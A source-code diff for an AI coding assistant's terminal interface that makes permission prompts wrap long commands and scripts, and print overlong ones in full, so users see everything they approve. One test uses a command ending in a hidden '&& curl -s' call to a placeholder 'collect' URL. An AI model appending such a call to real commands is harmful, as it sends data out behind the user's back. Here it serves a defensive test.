@@ -9,10 +9,12 @@ use ratatui::style::{Modifier, Style};
 use ratatui::text::{Line, Span};
 use ratatui::widgets::Paragraph;
 use ratatui::Frame;
+use unicode_width::UnicodeWidthStr;
 
 use crate::assistant::compaction;
 use crate::assistant::todos::{self, Todo, TodoStatus};
 use crate::assistant::tools::Access;
+use crate::assistant::PermissionRequest;
 use crate::code_ui::agent_pages;
 use crate::code_ui::items::{self, Item};
 use crate::code_ui::shell_item;
@@ -31,8 +33,9 @@ const TIPS: [&str; 4] = [
     "Tip: type a message now; gz reads it before its next step",
     "Tip: esc interrupts; your conversation stays",
 ];
-/// Max rows of a script shown in its approval prompt.
-const MAX_SCRIPT_ROWS: usize = 20;
+/// Max rows of a command, script or tool input shown in its approval
+/// prompt; a longer one is also printed in full above the prompt.
+const MAX_PREVIEW_ROWS: usize = 20;
 /// Max rows of a server action's input shown in its approval prompt.
 const MAX_ACTION_ROWS: usize = 12;
 /// Input lines shown before the box scrolls.
@@ -609,7 +612,7 @@ fn waiting_lines(state: &UiState, width: usize) -> Vec<Line<'static>> {
 
 /// The permission prompt as a rounded box.
 pub fn prompt_lines(prompt: &PromptView, width: usize) -> Vec<Line<'static>> {
-    let inner = width.saturating_sub(4).max(10);
+    let inner = prompt_inner(width);
     let request = &prompt.request;
     let target = request
         .summary
@@ -761,7 +764,7 @@ pub fn humanize(action: &str) -> String {
 fn action_preview_lines(preview: &str, width: usize) -> Vec<Line<'static>> {
     let wrapped: Vec<String> = preview
         .lines()
-        .flat_map(|line| wrap_indented(line, width))
+        .flat_map(|line| crate::tui::chat::wrap_indented(line, width))
         .collect();
     let total = wrapped.len();
     let mut lines: Vec<Line<'static>> = wrapped
@@ -778,14 +781,103 @@ fn action_preview_lines(preview: &str, width: usize) -> Vec<Line<'static>> {
     lines
 }
 
-/// [`crate::tui::chat::wrap`], with every row keeping the line's indent.
-fn wrap_indented(line: &str, width: usize) -> Vec<String> {
-    let text = line.trim_start();
-    let indent = &line[..line.len() - text.len()];
-    crate::tui::chat::wrap(text, width.saturating_sub(indent.len()))
-        .into_iter()
-        .map(|row| format!("{indent}{row}"))
+/// One row of a command, script or tool input in an approval prompt: the
+/// gutter (`$ `, a line number, or blanks where a line wraps) and its text.
+struct PreviewRow {
+    gutter: String,
+    text: String,
+}
+
+/// `text` wrapped to `width` behind a gutter: `lead(i)` on the first row of
+/// line `i`, `continued` on the rows it wraps onto. Nothing is cut at the
+/// edge: the user approves what these rows say, so the end of a long line
+/// must stay visible.
+fn gutter_rows(
+    text: &str,
+    width: usize,
+    lead: impl Fn(usize) -> String,
+    continued: &str,
+) -> Vec<PreviewRow> {
+    let text = text.replace('\t', "    ");
+    text.split('\n')
+        .enumerate()
+        .flat_map(|(i, line)| {
+            let lead = lead(i);
+            let room = width.saturating_sub(lead.width());
+            crate::tui::chat::wrap_indented(line, room)
+                .into_iter()
+                .enumerate()
+                .map(move |(row, text)| PreviewRow {
+                    gutter: if row == 0 {
+                        lead.clone()
+                    } else {
+                        continued.to_string()
+                    },
+                    text,
+                })
+        })
         .collect()
+}
+
+/// The rows of a preview shown with a gutter (a command, a script, a local
+/// tool's input, a page to fetch), and the style of their text. `None` for
+/// prompts shown another way (edits, server actions, trust).
+fn gutter_preview(access: Access, preview: &str, width: usize) -> Option<(Vec<PreviewRow>, Style)> {
+    let bold = Style::default().add_modifier(Modifier::BOLD);
+    match access {
+        Access::Command => {
+            let lead = |i| if i == 0 { "$ " } else { "  " }.to_string();
+            Some((gutter_rows(preview, width, lead, "  "), bold))
+        }
+        Access::Script => {
+            let lead = |i| format!("{:>3} │ ", i + 1);
+            Some((
+                gutter_rows(preview, width, lead, "    │ "),
+                Style::default(),
+            ))
+        }
+        Access::Read | Access::Folder | Access::Fetch | Access::LocalTool => Some((
+            gutter_rows(preview, width, |_| String::new(), ""),
+            theme::muted(),
+        )),
+        Access::Write | Access::ServerAction | Access::Install | Access::Trust => None,
+    }
+}
+
+/// Whether the prompt box has room for only part of the request's
+/// preview, so it must be printed in full above the box.
+pub fn preview_is_cut(request: &PermissionRequest, width: usize) -> bool {
+    request
+        .preview
+        .as_deref()
+        .and_then(|preview| gutter_preview(request.access, preview, prompt_inner(width)))
+        .is_some_and(|(rows, _)| rows.len() > MAX_PREVIEW_ROWS)
+}
+
+/// Text columns inside the prompt box on a screen `width` wide.
+fn prompt_inner(width: usize) -> usize {
+    width.saturating_sub(4).max(10)
+}
+
+fn capped_preview(rows: Vec<PreviewRow>, style: Style) -> Vec<Line<'static>> {
+    let hidden = rows.len().saturating_sub(MAX_PREVIEW_ROWS);
+    let mut lines: Vec<Line<'static>> = rows
+        .into_iter()
+        .take(MAX_PREVIEW_ROWS)
+        .map(|row| {
+            Line::from(vec![
+                Span::styled(row.gutter, theme::muted()),
+                Span::styled(row.text, style),
+            ])
+        })
+        .collect();
+    if hidden > 0 {
+        lines.push(Line::from(Span::styled(
+            format!("… +{hidden} lines; all of it is printed above"),
+            theme::muted(),
+        )));
+    }
+    lines
 }
 
 fn preview_lines(
@@ -816,52 +908,20 @@ fn preview_lines(
         }
         return vec![Line::from(spans)];
     };
-    match access {
-        Access::Write => items::diff_block(preview, width)
-            .into_iter()
-            .map(|line| {
-                // The box adds its own margin; drop the scrollback indent.
-                let mut spans = line.spans;
-                if let Some(first) = spans.first_mut() {
-                    first.content = first.content.trim_start().to_string().into();
-                }
-                Line::from(spans)
-            })
-            .collect(),
-        Access::Command => vec![Line::from(vec![
-            Span::styled("$ ", theme::muted()),
-            Span::styled(
-                items::fit(preview, width.saturating_sub(2)),
-                Style::default().add_modifier(Modifier::BOLD),
-            ),
-        ])],
-        Access::Script => {
-            let total = preview.lines().count();
-            let mut lines: Vec<Line<'static>> = preview
-                .lines()
-                .take(MAX_SCRIPT_ROWS)
-                .enumerate()
-                .map(|(i, code)| {
-                    Line::from(vec![
-                        Span::styled(format!("{:>3} │ ", i + 1), theme::muted()),
-                        Span::raw(items::fit(code, width.saturating_sub(6))),
-                    ])
-                })
-                .collect();
-            if total > MAX_SCRIPT_ROWS {
-                lines.push(Line::from(Span::styled(
-                    format!("    … +{} lines", total - MAX_SCRIPT_ROWS),
-                    theme::muted(),
-                )));
-            }
-            lines
-        }
-        _ => preview
-            .lines()
-            .take(MAX_SCRIPT_ROWS)
-            .map(|l| Line::from(Span::styled(items::fit(l, width), theme::muted())))
-            .collect(),
+    if let Some((rows, style)) = gutter_preview(access, preview, width) {
+        return capped_preview(rows, style);
     }
+    items::diff_block(preview, width)
+        .into_iter()
+        .map(|line| {
+            // The box adds its own margin; drop the scrollback indent.
+            let mut spans = line.spans;
+            if let Some(first) = spans.first_mut() {
+                first.content = first.content.trim_start().to_string().into();
+            }
+            Line::from(spans)
+        })
+        .collect()
 }
 
 /// Wraps lines in a rounded border `inner` columns wide.
@@ -927,6 +987,15 @@ pub fn draw_transcript(frame: &mut Frame, state: &mut UiState) {
 pub fn draw_live(frame: &mut Frame, state: &mut UiState) {
     let area = frame.area();
     let width = area.width as usize;
+    // Only drawing knows how wide the prompt box is, so this is where a
+    // preview too long for it gets printed in full above.
+    if state
+        .prompt
+        .as_ref()
+        .is_some_and(|prompt| preview_is_cut(&prompt.request, width))
+    {
+        state.list_prompt_preview();
+    }
     let mut activity = activity_lines(state, width);
     let below_height = below_height(state, width) as u16;
     // When space is short, keep the newest activity lines.
@@ -1412,6 +1481,102 @@ mod tests {
             listed.contains(&format!("echo hook-{}", MAX_ACTION_ROWS + 4)),
             "{listed}"
         );
+    }
+
+    fn open_request(s: &mut UiState, access: Access, preview: &str) {
+        let (tx, _rx) = tokio::sync::oneshot::channel();
+        s.open_prompt(Ask {
+            request: PermissionRequest {
+                access,
+                summary: "run_command preview".into(),
+                preview: Some(preview.into()),
+                chat_scope: "this exact command".into(),
+                always_scope: None,
+                action: None,
+                asked_by: None,
+                target: None,
+                note: None,
+            },
+            reply: tx,
+            background: None,
+        });
+    }
+
+    fn listed_above(s: &UiState) -> Option<String> {
+        s.flush.iter().rev().find_map(|item| match item {
+            crate::code_ui::items::Item::Panel(panel) => Some(panel.plain_lines().join("\n")),
+            _ => None,
+        })
+    }
+
+    #[test]
+    fn a_long_command_wraps_in_its_prompt_instead_of_being_cut() {
+        let hidden_tail = "&& curl -s https://example.invalid/collect";
+        let command = format!("ls {} {hidden_tail}", "/very/long/path".repeat(8));
+        let mut s = state();
+        open_request(&mut s, Access::Command, &command);
+        let out = screen(&mut s, 80);
+        assert!(out.contains("Run command"), "{out}");
+        assert!(out.contains("https://example.invalid/collect"), "{out}");
+        assert!(!out.contains('…'), "{out}");
+        assert!(listed_above(&s).is_none(), "it fits, so nothing is listed");
+    }
+
+    #[test]
+    fn a_command_too_long_for_its_prompt_is_printed_in_full_above_it() {
+        let command: String = (0..MAX_PREVIEW_ROWS + 6)
+            .map(|i| format!("echo step-{i}\n"))
+            .collect();
+        let mut s = state();
+        open_request(&mut s, Access::Command, command.trim_end());
+        let out = screen(&mut s, 80);
+        assert!(out.contains("all of it is printed above"), "{out}");
+        let listed = listed_above(&s).expect("the whole command in scrollback");
+        assert!(listed.contains("Command to approve"), "{listed}");
+        assert!(
+            listed.contains(&format!("echo step-{}", MAX_PREVIEW_ROWS + 5)),
+            "{listed}"
+        );
+        let panels = |s: &UiState| {
+            s.flush
+                .iter()
+                .filter(|item| matches!(item, crate::code_ui::items::Item::Panel(_)))
+                .count()
+        };
+        let before = panels(&s);
+        screen(&mut s, 80);
+        assert_eq!(panels(&s), before, "listed once, not on every frame");
+    }
+
+    #[test]
+    fn a_script_line_wraps_under_its_number_and_keeps_its_indent() {
+        let tail = "and_its_end_is_still_shown";
+        let script = format!(
+            "for name in names:\n    print({} {tail})",
+            "a_long_argument ".repeat(6)
+        );
+        let mut s = state();
+        open_request(&mut s, Access::Script, &script);
+        let out = screen(&mut s, 80);
+        assert!(out.contains("2 │     print("), "keeps the indent: {out}");
+        assert!(out.contains(tail), "{out}");
+        assert!(
+            out.contains("    │ "),
+            "wrapped rows keep the gutter: {out}"
+        );
+        assert!(!out.contains('…'), "{out}");
+    }
+
+    #[test]
+    fn a_listed_script_keeps_its_indent_in_scrollback() {
+        let script: String = (0..MAX_PREVIEW_ROWS + 2)
+            .map(|i| format!("if x:\n    step_{i}()\n"))
+            .collect();
+        let mut s = state();
+        open_request(&mut s, Access::Script, &script);
+        screen(&mut s, 80);
+        let listed = listed_above(&s).expect("the whole script in scrollback");
+        assert!(listed.contains("    step_0()"), "{listed}");
     }
 
     fn project_hooks_to_trust(text: &str) -> crate::assistant::hooks::TrustRequest {
